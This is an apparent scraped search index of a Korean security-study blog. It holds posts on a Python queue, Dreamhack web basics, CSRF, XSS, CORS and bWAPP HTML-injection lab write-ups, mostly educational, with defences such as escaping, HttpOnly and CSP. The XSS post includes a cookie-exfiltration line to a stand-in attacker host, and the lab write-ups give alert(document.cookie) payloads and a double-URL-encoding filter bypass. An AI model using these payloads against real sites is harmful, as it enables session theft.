구현Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081class Queue: '''Implementing a Queue with list variables''' def __init__(self): self.queue_list = list() def enqueue(self, data): self.queue_list.append(data) def dequeue(self): data = self.queue_list[0] del self.queue_list[0] return data def size(self): return self.queue_list.__len__()class LifoQueue(Queue): '''Implementing a LifoQueue with list variables''' def dequeue(self): data = self.queue_list[-1] del self.queue_list[-1] return dataclass PriorityQueue(Queue): '''Implementing a PriorityQueue with list variables''' def enqueue(self, data): if len(self.queue_list) == 0: self.queue_list.append(data) else: for _ in range(len(self.queue_list)): if data[0] &lt; self.queue_list[_][0]: self.queue_list.insert(_ ,data) return self.queue_list.append(data)if __name__ == '__main__': print('-'*5 + 'Queue' + '-'*5) # Queue instance 선언 queue = Queue() # 0~9 enqueue for _ in range(10): queue.enqueue(_) print('Size of Queue &gt;&gt;&gt;', queue.size()) print('Queue Print &gt;&gt;&gt;', *queue.queue_list) print('Queue Dequeue &gt;&gt;&gt;', queue.dequeue()) print('Queue Print &gt;&gt;&gt;', *queue.queue_list) print('\\n\\n' + '-'*5 + 'LifoQueue' + '-'*5) # LifoQueue instance 선언 lifo_queue = LifoQueue() # 0~9 enqueue for _ in range(10): lifo_queue.enqueue(_) print('Size of LifoQueue &gt;&gt;&gt;', lifo_queue.size()) print('LifoQueue Print &gt;&gt;&gt;', *lifo_queue.queue_list) print('LifoQueue Dequeue &gt;&gt;&gt;', lifo_queue.dequeue()) print('LifoQueue Print &gt;&gt;&gt;', *lifo_queue.queue_list) print('\\n\\n' + '-'*5 + 'PriorityQueue' + '-'*5) # PriorityQueue instance 선언 priority_queue = PriorityQueue() # Queue enqueue priority_queue.enqueue((1, 'a')) priority_queue.enqueue((2, 'b')) priority_queue.enqueue((-1, 'c')) priority_queue.enqueue((4, 'd')) priority_queue.enqueue((5, 'e')) priority_queue.enqueue((5, 'f')) print('Size of PriorityQueue &gt;&gt;&gt;', priority_queue.size()) print('PriorityQueue Print &gt;&gt;&gt;', *priority_queue.queue_list) print('PriorityQueue Dequeue &gt;&gt;&gt;', priority_queue.dequeue()) print('PriorityQueue Print &gt;&gt;&gt;', *priority_queue.queue_list) 출력12345678910111213141516171819-----Queue-----Size of Queue &gt;&gt;&gt; 10Queue Print &gt;&gt;&gt; 0 1 2 3 4 5 6 7 8 9Queue Dequeue &gt;&gt;&gt; 0Queue Print &gt;&gt;&gt; 1 2 3 4 5 6 7 8 9-----LifoQueue-----Size of LifoQueue &gt;&gt;&gt; 10LifoQueue Print &gt;&gt;&gt; 0 1 2 3 4 5 6 7 8 9LifoQueue Dequeue &gt;&gt;&gt; 9LifoQueue Print &gt;&gt;&gt; 0 1 2 3 4 5 6 7 8-----PriorityQueue-----Size of PriorityQueue &gt;&gt;&gt; 6PriorityQueue Print &gt;&gt;&gt; (-1, 'c') (1, 'a') (2, 'b') (4, 'd') (5, 'e') (5, 'f')PriorityQueue Dequeue &gt;&gt;&gt; (-1, 'c')PriorityQueue Print &gt;&gt;&gt; (1, 'a') (2, 'b') (4, 'd') (5, 'e') (5, 'f')","link":"/2021/02/11/Data-Structure-enqueue-dequeue-%EA%B8%B0%EB%8A%A5-%EA%B5%AC%ED%98%84/"},{"title":"Dreamhack Web 개요","text":"WebWeb이란?World Wide Web의 약자인 WWW or W3이지만, 편하게 Web으로 불림.사전적 의미는 거미줄과 같이 인터넷상에서 각각의 사용자(컴퓨터)가 연결되어 서로 정보를 공유한다는 의미에서 유래 Web : HTTP/HTTPS 프로토콜을 이용하여 정보를 공유하는 통신 서비스 Web Sever : 서비스 제공하는 대상 Web Client : 서비스를 받는 사용자(브라우저) 인터넷이 발전하면서 손쉽게 접근 가능하여, 웹 사이트를 접속하는 형태 외에도 API, 모바일, IoT 등에서 일상생활 곳곳에서 사용됨. Web의 역사 초기 문서 내용을 제공하는 간단한 서비스에서 사용자의 입력, 입력에 따른 기능 수행이 추가가 되면서 다양한 분야에서 사용할 수 있게됨. 이에 따른 웹 보안의 중요성도 증가됨. Web 작동 원리Web 흐름 Web Browser : 웹에 접속하기 위한 소프트웨어 Web Resource : 웹 상에 존재하는 콘텐츠 (이미지, 동영상, HTML, CSS, JS 등등) URI(URL) : Resource를 식별하기 위한 식별자 Cookie : 웹 브라우저에 저장하는 데이터 Session : 서버에 저장하는 데이터 Domain Name : 서버의 IP 주소를 문자로 쉽게 식별하는 이름 Application : 서버에서 설정한 특정 기능을 수행하는 소프트웨어 URI(URL) Scheme : 클라이언트가 엑세스하는 프로토콜 식별하는 데 사용 (주로 HTTP, HTTPS를 사용) Host : 웹 서버의 주소에 대한 정보 Port : 웹 서버의 접속할 포트에 대한 정보 Path : 접속할 웹 서버의 경로 및 파일 Query : 웹 서버에 전달하는 파라미터이며 URI에서 ?문자 뒤에 붙음. Fragment : Resource 내에서 섹션을 찾기위한 식별자(브라우저에서 처리) Encoding문자 또는 기호 등의 정보, 형태를 표준화, 보안 등의 목적으로 다른 형태나 형식으로 변환하는 처리 방식다른 형태에서 원래의 문자 또는 기호로 변환하는 것은 Decoding이라고 함. URL EncodingURI 내에서 예약어(구분자)로 사용되는 문자들을 전송하고자 할 때 사용 ex) http://example.com/?a=?b&amp;c=&amp;d - http://example.com/?a=%3Fb&amp;c=%26d첫번째는 어디가 Query인지 구별이 안되지만, Url Encoding 후에는 구별이 가능 인코딩 방식은 입력된 문자를 Ascii 테이블에서 매칭되는 Hex 값 앞에 % 문자를 붙이면 됨. (그래서 퍼센트 인코딩이라 불림) ? : %3F # : %23 &amp; : %26 = : %3D HTML entity EncodingHTML 내에서 사용하는 문자열이 HTML에서 사용되는 태그로 인식하지 않도록 하기 위해 사용 인코딩 방식은 입력된 문자를 Ascii 테이블에서 매칭되는 Hex 값 앞에 &amp;#x를 붙이거나, 주용한 문자들에 대해서 지정되어 있는 Entity name을 사용하여 인코딩 &amp; : &amp;amp; : &amp;#x26; &lt; : &amp;lt; : &amp;#x3c; &gt; : &amp;gt; : &amp;#x3E; HTTP Method : 서버에 요청 시 수행하고자 하는 동작 Version : HTTP의 버전 Header : 사용자와 서버가 상호 작용하기 위한 정보 Body : Header 밑에 존재하는데 사용자가 입력한 데이터가 서버에 전달 시 데이터를 담는 부분 Status Code : 사용자의 요청에 대한 서버의 처리 결과 Body : 서버가 사용자에게 응답하는 데이터를 담는 부분 HTTP Method 메소드는 각각의 목적을 두고 설계되었지만, 서버에서 설정하는 방식이나 웹 어플리케이션의 처리에 따라 수행하는 방식이 다르게 사용됨. OPTIONS : 요청하는 리소스가 허용되는 메소드 목록을 반환함. HEAD : GET 메소드와 동일하지만, Response의 Body 부분은 받지 않고, Header만 받음. (주로 서버의 상태 확인용) GET : 리소스를 요청함. POST : 특정 리소스 생성 및 데이터 추가를 위해 값을 제출할 때 사용함. PUT : 특정 리소스의 내용을 보낸 값으로 설정함. PATCH : 특정 리소스의 내용 중 보낸 값의 KEY만 변경함. DELETE : 특정 리소스 삭제함. TRACE : 요청받은 값을 Response의 Body로 다시 클라이언트에게 되돌려줌. HTTP Header종류가 너무 많아 자세한 내용은 MDN에서 확인 HTTP Status Code 중요한 부분이니 꼭 꼼꼼히 살펴보면 좋음. 이 부분도 종류가 많아 자세한 내용은 MDN에서 확인 200번 영역사용자의 요청에 대한 서버의 처리 성공을 뜻함. 200 : ok 201 : Created 300번 영역사용자가 요청한 리소스가 다른 경로로 변경된 경우을 뜻함. 201 : Moved Permanently 302 : Found 400번 영역사용자가 서버에 요청하는 구조 또는 데이터가 잘못되었음을 뜻함. 400 : Bad Request 403 : Forbidden 404 : Not Found 500번 영역서버의 에러와 관련된 영역임 500 : Internal Server Error CookieHTTP은 하나의 Request와 Response의 쌍이 독립적으로 구성되어 통신하는 Connectionless, stateless 프로토콜이다. Connectionless은 하나의 요청에 하나의 응답을 한 후 네트워크 연결을 끝맺는 것을 의미함.불특정 다수의 사용자에게 서비스되어야 하는 웹의 특성상 계속 연결 상태를 유지하는 것은 서버 부하로 이어질 가능성이 있어서 Connectionless를 지니게 됨. 네트워크, 서버 등의 성능 향상으로 HTTP/1.1부터 Keep-Alive를 통해 일정 시간 동안 사용자와 서버가 계속 연결을 맺고 있는 방식을 사용함. stateless은 네트워크 연결이 끝맺을 때 상태를 유지하지 않는 것을 의미함. HTTP 요청마다 새로운 커넥션을 열기 때문에 사용자 인증을 계속해서 해야 한다는 단점이 있음. 이러한 단점을 개선하기 위해 Cookie가 탄생함. &lt;cookie-name&gt;=&lt;cookie-value&gt; 형태를 띄는 이름-값 쌍으로 쿠키에 저장하고, 만료 시간, 접근할 수 있는 도메인 등 추가 옵션을 설정할 수 있음. HTTP 요청을 보낼 때 웹 브라우저가 자동으로 헤더에 쿠키를 추가해 전송함. Session 쿠키에 인증 상태를 포함한 데이터를 저장하면 사용자가 임의 사용자로 인증된 것 처럼 요청을 조작할 수 있음. 따라서 서버에 데이터를 저장하기 위해 Session을 사용함. 웹 브라우저에는 localStorage라는 저장공간도 존재하는데 Session ID가 쿠키에 국한되지 않고 localStorage 등 다양한 곳에 저장되어 사용될 수 있음. Web Hacking이란?본래의 의도와는 다른 동작을 일으키거나 주어진 권한 이상으로 정보를 열람, 복제, 변경 가능한 행위가 웹에서 발생하는 것을 말함. Web Hacking Attack Vacter웹은 사용자의 입력을 받고 웹 사이트와 통신하는 Client-side, 사용자의 요청을 처리하는 Server-side로 나누어 볼 수 있음. 웹 해킹을 할 때에도 이와 마찬가지로 Client-side, Server-side로 공격 대상을 나누어 볼 수 있음. Client-side Attack서비스 사용자에 대한 공격을 의미함. 사용자는 브라우저를 통해 서비스를 제공받는데 웹 서버가 제공해주는 데이터가 공격자에 의해 변조되었을 경우 브라우저에서 랜터링 과정에서 취약점이 발생하는 경우가 대표적임. Server-side Attack서비스를 운용하는 서버에 대한 공격을 의미함. 다양한 공격 형태가 존재하며, 공격자가 공격에 성공하게 되면 서버의 어플리케이션 코드 또는 다른 계정의 정보 유출, 서버 탈취 등으로 이어질 수 있음.","link":"/2021/02/14/Dreamhack-Web-01/"},{"title":"Dreamhack Web Client-side 기초 - CSRF","text":"CSRF(Cross Site Request Forgery)이란?브라우저는 기본적으로 SOP(Same-Origin-Policy)에 위반되지 않은 모든 요청에 쿠키를 포함해 전송함. 비정상적으로 사용자의 의도와 무관하게 다른 사이트에 HTTP 요청을 보내는 것을 CSRF 공격이라 함. 공격을 통해 공격자가 취할 수 있는 이득은 해당 세션 쿠키를 가진 사람만 사용할 수 있는 기능을 요청할 수 있다는 것임. CSRF 공격을 성공적으로 수행하기 위해서는 아래 두 가지 조건이 요구됨. 해당 사이트가 쿠키를 이용한 인증 방식을 사용해야함.모든 HTTP 전송엔 쿠키가 함께 전송되기 때문에 쿠키에 저장된 세션 아이디로 전송됨. 공격자가 사전에 알 수 없는 파라미터가 존재해서는 안됨.자동입력 방지 문자를 넣어야하는 요청이나 패스워드 변경 시 기존 패스워드를 입력해야하는 경우는 공격자가 입력해야하는 값을 모르기 때문에 공격이 실패하게 됨. 방어법CSRF 공격을 막기 위해서는 보통 두 가지 방법을 사용함. 세션 쿠키 대신 커스텀 헤더를 사용하여 사용자 인증 공격자가 예측할 수 없는 파라미터 추가 및 검증Sam Origin에서만 접근 가능한 데이터 삽입 (CSRF Token), CAPTCHA, 비밀번호 등등 위 두가지 방법은 서버 사이드에서 추가적인 검증을 통해 CSRF를 방어하는 방법임. 서버 코드에 검증 로직이 추가되는 방식이라 서버에 오버헤드가 발생하게됨. 직접적인 원인을 생각해보면, 브라우저가 크로스 사이트(다른 사이트)로부터 온 요청에 쿠키를 함께 전송한다는 것임. 이를 잡기 위해 SameSite 쿠키 설정이라는 개념이 있음. SameSite 쿠키는 다른 사이트로부터 온 요청에 쿠키를 삽입할지를 설정을 통해서 결정할 수 있음. 설정 옵션은 Strict, Lax, Normal 값으로 설정 가능함. Strict 옵션모든 크로스 사이트에서 출발한 요청에 해당 쿠키를 삽입하지 않음. Lax 옵션Link, Prerender, Form GET을 제외한 요청에는 쿠키를 삽입하지 않음. Normal 옵션옵션을 설정하지 않을 시와 동일한 권한을 가짐. 크롬은 2020년부터 개발자가 강제로 SameSite=None;Secure;을 넣지 않는 이상 모든 쿠키에 SameSite=Lax를 강제로 적용시킴.","link":"/2021/03/06/Dreamhack-Web-Client-side-%EA%B8%B0%EC%B4%88-CSRF/"},{"title":"Dreamhack Web Client-side 기초 - Xss","text":"XSS(Cross Site Scripting) 이란?서버의 응답에 공격자가 삽입한 악성 스크립트가 포함되어 사용자의 브라우저에서 해당 스크립트가 실행되는 취약점을 XSS라고 함. XSS은 임의의 악성 스크립트를 실행할 수 있으며 이를 통해 사이트의 사용자 쿠키 또는 세션을 탈취해 사용자의 권한을 얻거나, 사용자의 페이지를 변조하는 등의 공격을 수행할 수 있음. XSS 공격을 성공적으로 수행하기 위해서는 아래의 두가지 조건이 요구됨. 입력 데이터에 대한 충분한 검증 과정이 없어야 함.입력한 데이터가 충분한 검증 과정이 이루어지지 않아 악성 스크립트가 삽입될 수 있어야 함. 서버의 응답 데이터가 브라우저 내 페이지에 출력 시응답 데이터 출력 시 악성 스크립트가 브라우저의 렌더링 과정에 성공적으로 포함되어야 함. XSS with JavascriptJavascript는 사용자의 브라우저에서 화면을 동적으로 보여줄 수 있도록 자동으로 버튼을 누르거나 화면 구성을 바꾸는 등의 작업을 할 때 많이 사용됨. 이외에도 사용자와의 상호작용 없이 사용자의 권한으로 정보를 조회, 변경하는 등의 요청을 주고 응답받는 것도 가능함. 이는 사용자의 권한을 가지고 있는 세션 쿠키는 사용자에게 저장되어있고 브라우저는 해당 쿠키에 접근할 수 있기 때문. 이 밖에 브라우저에서 출력되어지는 페이지의 내용을 조작하거나, 브라우저의 페이지를 공격자가 원하는 주소로 변경 가능함. 이처럼 사용자 입장에서 발생하는 행위를 동작 시킬 수 있기 때문에 자바스크립트는 XSS 공격 시 많이 사용됨. XSS 공격에 많이 쓰이는 Javascript 예시쿠키 및 세션12345678910111213141516&lt;script&gt;// alert창으로 &quot;Hello&quot; 문자열 출력alert(&quot;Hello&quot;);// 현재 페이지의 쿠키document.cookie;// 쿠키 생성 (key: name, value: test)document.cookie = &quot;name=test;&quot;;/*new Image()는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정함.이를 이용하여 src에 공격자의 주소를 넣으면, 브라우저에서 src의 주소로 요청하기 때문에 공격자가 원하는 데이터를 파라미터로 넣고 요청할 수 있음.*/new Image().src = &quot;http://hacker.dreamhack.io/?cookie=&quot; + document.cookie;&lt;/script&gt; 페이지 변조1234567&lt;script&gt;// 사용자의 페이지 정보에 접근document;// 사용자의 페이지에 데이터 삽입document.write(&quot;Hacked By DreamHack!&quot;);&lt;/script&gt; 위치 이동1234567&lt;script&gt;// 피싱 공격 등으로 사용됨.location.href = &quot;http://hacker.dreamhack.io/phishing&quot;;// 새 창 열기window.open(&quot;http://hacker.dreamhack.io/&quot;);&lt;/script&gt; 분류Stored XSS악성 스크립트가 서버 내에 존재하는 데이터베이스 또는 파일 등의 형태로 저장되어 있다가 사용자가 저장된 악성 스크립트를 조회하는 순간 발생하는 형태의 XSS임. 서버 내에 저장되어 있는 형태에서는 불특정 다수에게 공격이 가능하다는 점에서 높은 파급력을 가질 수 있는 가능성도 존재하지만, 사용자가 많이 없는 서비스일 경우 파급력이 높지 않을 수 있음. Reflected XSS악성 스크립트가 사용자의 요청과 함께 전송되는 형태임. 사용자가 요청한 데이터가 서버의 응답에 포함되어 HTML 등의 악성 스크립트가 그대로 출력되어 발생하게 됨. Stored XSS와는 다르게 사용자의 요청 데이터에 의해 취약점이 발생함으로 변조된 데이터가 사용자의 요청으로 전송되는 형태를 유도해야함. 간단한 방법으로는 특정 링크를 유도하는 방식이 존재하며 Click Jacking, Open Redirect 등의 다른 취약점과 연계하여 발생시키는 방법도 존재함. 방어 방법오래전부터 발생되었고, 빈번하게 일어나는 취약점이기 때문에 이를 방어하기 위해 많은 방안들이 생겨남. 브라우저 단에서 방어하는 기술뿐만 아니라 서버 내부에서 저장하는 시점 혹은 저장된 데이터를 출력하는 시점에 입력 값을 올바르게 검증하는 방식으로 XSS를 방어해야함. Server-side MitigationsXSS를 유발할 수 있는 태그 삽입을 방지하기 위해 서버 단에서 검증하는 방법 사용자의 입력 값이 HTML 태그가 될 일이 없다면 꺽쇠 (&lt;, &gt;), 따옴표(“, ‘)와 같은 특수 문자를 HTML Entity Encoding을 이용해 태그로 인식하지 않도록 수정(Escape) 할 수 있음. 만약 사용자 입력 값에 HTML 형태를 지원해야 한다면 화이트리스트 필터링을 해야 함. 사용자의 입력 값을 필터링 할 때 유의할 점은 요청의 URI Query 값이나 POST Body 값만 필터링하는 것이 아니라 User-Agent, Referer와 같은 헤더도 모두 포함하여 사용자로부터 입력된 값에 모두 적용해야 함. Mozilla에서 제작한 Bleach라는 HTML 필터링 라이브러리를 추천함. 이 외에도 사용자가 로그인할 때 세션에 로그인한 IP주소를 함께 저장하고, 사용자가 페이지를 접속할 때마다 현재 IP주소와 로그인 했던 IP주소의 동일 여부를 확인하는 방법이 있음. 해당 방법은 공격자가 세션 ID를 탈취해도 피해자와 IP주소가 달라 피해자의 세션을 사용하지 못하게 하는 장점이 있어 과거에 널리 쓰였습니다. 현재는 Mobile 환경의 사용자가 많아져서 WiFi로 인터넷을 하기 때문에 IP주소가 매번 바뀌기 때문에 접속한 국가가 변경된 경우를 탐지하는 형태로 변형됨. HTTPOnly Flag1Set-Cookie: session=fdeasgweqw; HttpOnly HTTPOnly 플레그는 서버 측에서 응답 헤더에 Set-Cookie 헤더를 전송해 자바스크립트에서 해당 쿠키에 접근 하는 것을 금지함. 이는 쿠키를 생성할 때 옵션으로 설정 가능하며, XSS 취약점이 발생하더라도 공격자가 알아낼 수 없는 쿠키 값이기 때문에 세션쿠키를 설정할 땐 HTTPOnly 플래그를 적용하는 것을 권장함. Content Security Policy (CSP)CSP는 응답 헤더나 meta 태그를 통해 아래와 같이 선언해서 사용할 수 있으며, 각각의 지시어를 적용하여 사이트에서 로드하는 리소스들의 출처를 제한할 수 있음. 1Content-Security-Policy: &lt;지시어&gt;; ... X-XSS-Protection HeaderX-XSS-Protection은 Response Header에 아래와 같이 선언해서 사용할 수 있음. 1X-XSS-Protection: &lt;값&gt; 해당 정색은 브라우저에 내장된 XSS Filter를 활성화할 것인지를 판단함. XSS Filter는 브라우저에서 전송된 Request 값이 XSS 공격 코드와 유사하고, Response에 해당 공격 코드가 포함되었을 경우에 XSS 공격이 수행되고 있음을 판단하여 XSS 공격 발생을 사용자에게 알리고 차단함. Request 값과 Response를 비교해 판단하는 것을 보아 Reflected XSS 공격을 막는 데에 적합한 방어 방법임을 알 수 있으며, 다른 유형의 XSS 공격을 방어할 수 없음. 123456789101112// XSS Filter FalseX-XSS-Protection: 0// XSS Filter True 기본값으로 설정// XSS 공격이 탐지되면 해당 부분만 제거한 뒤 페이지의 결과를 화면에 출력X-XSS-Protection: 1// XSS 공격이 탐지되면 페이지 전체의 렌더링 중단X-XSS-Protection: 1; mode=block// XSS 공격이 탐지된 사실을 미리 설정한 주소에 신고하여 담당자가 대처하기 쉽도록함.X-XSS-Protection: 1; report=&lt;reporting-uri&gt; XSS Filter는 XSS 공격에 대한 강력한 방어 수단이었지만, 최신 브라우저에선 사용하지 않는 추세임. 실 서비스의 보안을 위해서 이 헤더를 신뢰하지 않는 것을 권장함.","link":"/2021/02/17/Dreamhack-Web-Client-side-%EA%B8%B0%EC%B4%88-Xss/"},{"title":"Dreamhack Web Client-side 기초 - 개요","text":"개요HTTP는 Connectionless와 Stateless한 특성을 가지고 있기 때문에 웹 서버가 사용자를 식별하기 위해 보편적으로 쿠키와 세션을 사용한다고 했음. 공격자는 사용자로부터 본인을 식별하기 위한 사용자 정보, 즉 쿠키나 세션에 저장된 세션 아이디를 탈취해 사용자 권한을 얻거나, 사용자의 브라우저에서 자바스크립트를 실행하는 등의 특별한 행위를 수행해 사용자가 요청을 보낸 것처럼 하는 것이 Client-side 취약점의 주 목적임. 브라우저는 HTTP 요청을 생성할 때 시작 주소(Referer)와 상관없이 대상 호스트가 발급한 쿠키를 삽입함. SOP (Same Origin Policy)브라우저를 통해 대상 호스트에 요청 시 사용자의 정보를 담고 있는 쿠키도 함께 전송되기 때문에 외부 리소스를 불러오는 엘리먼트(iframe, img, video)를 자바스크립트로 관리할 수 있다면 사용자 동의 없이 해당 내용을 읽거나 변조할 수 있음. 브라우저가 위와 같은 공격으로부터 사용자를 보호하기 위해 SOP(Same Origin Policy)정책을 만듬. 이 정책은 쉽게 말하면, scheme, host, port 셋 중 하나가 틀리면 외부 리소스나 자바스크립트의 실행을 제한됨. CORS (Cross Origin Resource Sharing)일반적으로는 SOP 영향으로 서로 다른 오리진의 리소스를 공유하지 못함. 하지만 개발 또는 운영의 목적으로 다른 오리진과 리소스를 공유해야하는 상황이 있음. 때문에 SOP이 적용된 상태에서도 리소스를 공유하는 몇가지 방법이 존재함. postMessage : 메시지를 주고받기 위한 이벤트 핸들러를 이용해 리소스 공유함.https://dreamhack.io1234567var testWindow = window.open('http://test.dreamhack.io');window.addEventListener('message', function (e) { if (e.origin === 'http://test.dreamhack.io') { console.log(e.data); // 'bye' }});testWindow.postMessage('hello', 'http://test.dreamhack.io'); http://test.dreamhack.io123456window.addEventListener('message', function (e) { if (e.origin === 'https://dreamhack.io') { console.log(e.data); // 'hello' e.source.postMessage('bye', 'https://dreamhack.io'); }}); 이벤트 핸들러을 이용하여 origin을 변경하여 메시지를 통신하는 코드 JSONP : 스크립트 태그를 통해 외부 자바스크립트 코드를 호출하면 현재 오리진에서 해당 코드가 실행된다는 점을 이용한 방법임. 스크립트 태그를 통해 다른 오리진의 리소스를 요청하고, 응답 데이터를 현재 오리진의 Callback 함수에서 다루는 방식으로 리소스를 공유함.https://dreamhack.io123456&lt;script&gt;function myCallback(data){ console.log(data.id) // 'dreamhack'}&lt;/script&gt;&lt;script src='http://test.dreamhack.io/me?callback=myCallback'&gt;&lt;/script&gt; http://test.dreamhack.io/me?callback1myCallback({'uid':1, 'id':'dreamhack', 'pw':'********'}); 자신의 HTML에서 자바스크립트로 myCallback 함수를 만들어서 test.dreamhack.io의 myCallback 값을 가져옴. CORS 헤더 : 다른 오리진이 허용하는 설정 등을 HTTP 헤더를 통해 확인한 후 허용하는 요청을 보내 리소스를 공유하는 방식임.https://dreamhack.io12345xhr = new XMLHttpRequest();xhr.open('POST', 'https://test.dreamhack.io/me');xhr.withCredentials = true;xhr.setRequestHeader('Content-Type', 'application/json');xhr.send(&quot;{'data':'hello world!'}&quot;); 위 코드와 같이 https://dreamhack.io에서 https://test.dreamhack.io/me에 대해 요청을 하게 되면 아래와 같이 OPTIONS헤더를 통해 메소드, 헤더 등이 허용하는지 확인함. 이 과정을 CORS preflight 이라고 함.HTTP Request12345678OPTIONS /me HTTP/1.1Host: test.dreamhack.ioConnection: keep-aliveAccess-Control-Request-Method: POSTAccess-Control-Request-Headers: content-typeOrigin: https://dreamhack.ioAccept: */*Referer: https://dreamhack.io/ HTTP Response12345HTTP/1.1 200 OKAccess-Control-Allow-Origin: https://dreamhack.ioAccess-Control-Allow-Methods: POST, GET, OPTIONSAccess-Control-Allow-Credentials: trueAccess-Control-Allow-Headers: Content-Type OPTIONS 헤더를 통해 전송을 허용하는 정보를 확인한 후 허용하는 정보들을 기반으로 https://dreamhack.io에서 https://test.dreamhack.io/me와의 리소스 공유가 가능하게 됨.","link":"/2021/02/16/Dreamhack-Web-Client-side-%EA%B8%B0%EC%B4%88/"},{"title":"HTML Injection - Reflected(GET &amp; POST)","text":"Get문제와 Post문제는 동일한 방법으로 진행됨으로 Get문제 풀이만 하겠다. Low문제 제목이 HTML 인젝션이니 확인을 위해 First Name에 HTML 태그를 입력하겠다. &lt;h1&gt;test&lt;/h1&gt; 입력하니 HTML 태그가 그대로 적용이 되어있다. HTML 태그가 적용이 된다는 것은 자바스크립트도 적용이 된다는 뜻으로 이어갈 수 있다. &lt;script&gt;alert(document.cookie)&lt;/script&gt; 자바스크립트로 Cookie 값을 출력하였다.이런식으로 신뢰하지 못하는 사용자가 입력을 할 수 있는 입력은 검증이 필요하다. Medium문제의 난이도가 올라갔으니 입력 값에 대한 검증이 있을 것이다.그래도 일단 확인을 위해 Low Level처럼 HTML 태그를 입력하겠다. &lt;h1&gt;test&lt;/h1&gt; HTML 태그가 적용이 되지 않고 그대로 출력된 것을 확인 할 수 있다. php 소스코드를 확인을 안했다는 하에 추측상으로 &lt;, &gt;, /이 치환되었다고 생각할 수 있다.치환을 우회할 수 있는 방법을 검색하였다. 검색 결과 Double Url Encoding을 통해 우회할 수 있다는 정보를 얻을 수 있었다.이를 이용하기 위해서 &lt;, &gt;, /을 Url 인코딩하여 입력하겠다. 12345from urllib import parsestring = input()parameter = { 'substitution' : string }print( parse.urlencode(parameter, encoding='UTF-8', doseq=True) ) Online Url Encoding : https://www.convertstring.com/ko/EncodeDecode/UrlEncode 파이썬 코드와 온라인 Url인코딩을 이용하여 &lt;script&gt;alert(document.cookie)&lt;/script&gt;을 Double Url Encoing하였다. %253cscript%253ealert(document.cookie)%253c%252fscript%253e 사실 이렇게 안해도 form에 Url Encoding만 넣어줘도 자동으로 특수문자가 Url Coding이 되기 때문에 굳이 Url에 Double Url Encoding을 직접 입력하지 않고, form에 Url 인코딩만 넣어도 된다. Xss를 성공했으니, 어떻게 &lt;, &gt;, /를 치환했는지 확인하겠다. functions_external.php의 xss_check_1함수를 확인하였다. 1234567891011121314function xss_check_1($data){ // Converts only &quot;&lt;&quot; and &quot;&gt;&quot; to HTLM entities $input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data); $input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input); // Failure is an option // Bypasses double encoding attacks // &lt;script&gt;alert(0)&lt;/script&gt; // %3Cscript%3Ealert%280%29%3C%2Fscript%3E // %253Cscript%253Ealert%25280%2529%253C%252Fscript%253E $input = urldecode($input); return $input;} 확인해보니, &lt;, &gt;를 이스케이핑으로 php의 str_replace을 사용하여 치환하였다.하지만 Url 인코딩으로 서버에서는 %253c으로 입력받기 때문에 치환을 우회할 수 있었다. HighHigh 단계는 거의 우회하기 힘든 단계이다.소스코드를 살펴보도록 하겠다. 123456function xss_check_2($data){ // htmlentities - converts all applicable characters to HTML entities return htmlentities($data, ENT_QUOTES); } htmlentities()을 이용하여 xss를 검증하고 있다. htmlentities()은 밑과 같은 문자를 치환하는 함수이다. &amp;는 &amp;amp;가 됩니다 &quot;는 ENT_NOQUOTES를 설정하지 않았을 때 &amp;quot;가 됩니다. '(홑따옴표)는 ENT_QUOTES가 설정되었을 때만 &amp;#039;가 됩니다. &lt;(미만)은 &amp;lt;가 됩니다. &gt;(이상)은 &amp;gt;가 됩니다. Url Encoding이란?정확히는 **퍼센트 인코딩(Percent Encoding)**이 맞지만, 흔히 Url에서 사용되어 Url 인코딩으로 불리고 있다.퍼센트 인코딩은 Url에서 사용할 수 없는 문자(특수문자, 예약문자 등등)을 사용할 수 있도록 인코딩한다. 인코딩된 문자는 triplet(트리플렛, 세개가 한묶음)로 인코딩되며, 인코딩된 문자는 %로 시작한다. 그 뒤의 두 숫자는 16진수로 표현된다. [참고 사이트] 욕망의개발자(네이버 블로그) : https://m.blog.naver.com/PostView.nhn?blogId=j880825&amp;logNo=221231640609&amp;proxyReferer=https:%2F%2Fwww.google.com%2F 퍼센트 인코딩(위키백과) : https://ko.wikipedia.org/wiki/%ED%8D%BC%EC%84%BC%ED%8A%B8_%EC%9D%B8%EC%BD%94%EB%94%A9 Double Url Encoding이란?쉽게 말하면 Url 인코딩을 다시 한번 더 Url 인코딩을 한 것이다. 이 공격 기술은 흔히 공격 기술처럼 예상치 못한 동작을 유발하기 위해 2번 인코딩을 한 것이다.가능한 이유는 웹서버가 다양한 인코딩 형식으로 클라이언트 요청을 수락하고 처리하기 때문이다. 이스케이핑이란?HTML 코드는 브라우저에 의해서 해석되는 약속된 문자들이다.주로, 웹사이트에 HTML 태그 본 그래로 출력하려고 하는데 브라우저에서는 바로 HTML로 출력하게 된다. 이 떄문에 이스케이핑을 사용하여 HTML 태그를 출력하게 한다. [참고 사이트] 생활코딩 : https://opentutorials.org/course/1469/2824","link":"/2020/12/06/HTML-Injection-Reflected-GET/"},{"title":"HTML Injection - Reflected(URL)","text":"Low들어가보니 딸랑 이거 뿐이다.문제의 제목을 보니 URL이니깐 URL에 HTML 태그를 넣어주면 반영해주는 것 같다. Burp Suite를 사용하여 URL에 HTML 태그를 넣어줬다. ?&lt;h1&gt;test&lt;/h1&gt; 12345678910GET /bWAPP/htmli_current_url.php?&lt;h1&gt;test&lt;/h1&gt; HTTP/1.1Host: 192.168.219.111Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=a10521c7e9d86bd7482f26f136d6cbe2; security_level=0Connection: close 여기서 직접 Url창에 입력하지 않은 이유는 Url창에 입력하여 서버에 요청을 하면 브라우저에서 특수문자를 Url Encoding을 하여 요청을 보내기 때문이다.하지만 HTML Injection - Reflected(GET)에서는 됬는데 왜 여기서는 안되는 이유는 이 문제의 php 기능 중에 Url Decoding을 하지 않기 때문이다. 12// $url = &quot;http://&quot; . 